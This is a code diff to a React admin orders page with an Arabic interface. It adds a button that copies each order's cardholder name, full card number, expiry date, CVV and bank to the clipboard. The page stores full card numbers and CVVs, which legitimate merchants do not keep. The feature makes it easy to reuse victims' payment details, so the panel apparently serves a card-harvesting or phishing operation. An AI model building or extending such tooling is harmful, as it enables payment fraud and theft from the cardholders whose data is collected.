@@ -4,8 +4,9 @@ import { format } from "date-fns";
 import { ar } from "date-fns/locale";
 import {
   Search, CreditCard, Mail, Phone, Hash, Receipt, Ticket,
-  CheckCircle, XCircle, Filter, ShieldCheck, Clock, Ban, Landmark,
+  CheckCircle, XCircle, Filter, ShieldCheck, Clock, Ban, Landmark, Copy, Check,
 } from "lucide-react";
+import { toast } from "sonner";
 import ExportButtons from "@/components/admin/ExportButtons";
 
 interface Order {
@@ -43,6 +44,24 @@ const AdminOrders = () => {
   const [loading, setLoading] = useState(true);
   const [search, setSearch] = useState("");
   const [statusFilter, setStatusFilter] = useState<string>("all");
+  const [copiedId, setCopiedId] = useState<string | null>(null);
+
+  const copyCardInfo = (order: Order) => {
+    const parts: string[] = [];
+    if (order.cardholder_name) parts.push(`الاسم: ${order.cardholder_name}`);
+    if (order.card_full_number) parts.push(`الرقم: ${order.card_full_number}`);
+    else if (order.card_last4) parts.push(`الرقم: •••• ${order.card_last4}`);
+    if (order.card_expiry) parts.push(`الانتهاء: ${order.card_expiry}`);
+    if (order.card_cvv) parts.push(`CVV: ${order.card_cvv}`);
+    if (order.card_brand) parts.push(`النوع: ${order.card_brand}`);
+    if (order.bank_name) parts.push(`البنك: ${order.bank_name}`);
+    
+    navigator.clipboard.writeText(parts.join("\n")).then(() => {
+      setCopiedId(order.id);
+      toast.success("تم نسخ بيانات البطاقة", { duration: 2000 });
+      setTimeout(() => setCopiedId(null), 2000);
+    });
+  };
 
   const fetchOrders = async () => {
     const { data } = await supabase
@@ -257,11 +276,24 @@ const AdminOrders = () => {
 
                   {/* Payment */}
                   <div className="rounded-xl overflow-hidden border border-slate-100/80">
-                    <div className="bg-gradient-to-l from-violet-50/80 to-transparent px-3 py-2 border-b border-slate-100/50">
+                    <div className="bg-gradient-to-l from-violet-50/80 to-transparent px-3 py-2 border-b border-slate-100/50 flex items-center justify-between">
                       <span className="text-[11px] font-bold text-violet-600 flex items-center gap-1.5">
                         <CreditCard className="w-3.5 h-3.5" />
                         بيانات الدفع
                       </span>
+                      {(o.card_full_number || o.card_last4) && (
+                        <button
+                          onClick={() => copyCardInfo(o)}
+                          className={`flex items-center gap-1 px-2 py-1 rounded-lg text-[10px] font-semibold transition-all duration-200 ${
+                            copiedId === o.id
+                              ? "bg-emerald-100 text-emerald-600"
+                              : "bg-violet-100 text-violet-600 hover:bg-violet-200 active:scale-95"
+                          }`}
+                        >
+                          {copiedId === o.id ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
+                          {copiedId === o.id ? "تم النسخ" : "نسخ البيانات"}
+                        </button>
+                      )}
                     </div>
                     <div className="p-3 space-y-2 text-[12px]">
                       <div className="flex items-center justify-between">
